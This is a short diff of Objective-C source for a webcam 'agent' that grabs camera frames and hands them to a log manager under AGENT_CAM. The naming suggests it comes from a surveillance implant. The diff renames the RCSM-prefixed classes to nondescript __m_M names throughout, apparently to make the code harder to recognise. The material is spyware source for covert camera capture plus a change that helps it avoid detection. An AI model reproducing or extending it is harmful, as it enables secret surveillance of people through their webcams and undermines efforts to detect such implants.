@@ -25,9 +25,9 @@
                               {if(mCurrentImageBuffer) CVBufferRelease(mCurrentImageBuffer);mCurrentImageBuffer=NULL;}\
                               break;}}
                               
-static RCSMAgentWebcam *sharedAgentWebcam = nil;
+static __m_MAgentWebcam *sharedAgentWebcam = nil;
 
-@interface RCSMAgentWebcam (hidden)
+@interface __m_MAgentWebcam (hidden)
 
 - (BOOL)_initSession;
 - (BOOL)_releaseSession;
@@ -41,7 +41,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 
 @end
 
-@implementation RCSMAgentWebcam (hidden)
+@implementation __m_MAgentWebcam (hidden)
 
 - (BOOL)_initSession
 {
@@ -208,7 +208,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
       infoLog(@"startGrabImageWitFrame: frame %d grabbed! frame ptr = 0x%x", i, mCurrentImageBuffer);
 #endif
       
-      RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+      __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
       BOOL success = [logManager createLog: AGENT_CAM
                                agentHeader: nil
                                  withLogID: 0];
@@ -275,9 +275,9 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 
 @end
 
-@implementation RCSMAgentWebcam
+@implementation __m_MAgentWebcam
 
-+ (RCSMAgentWebcam *)sharedInstance
++ (__m_MAgentWebcam *)sharedInstance
 {
   @synchronized(self)
   {
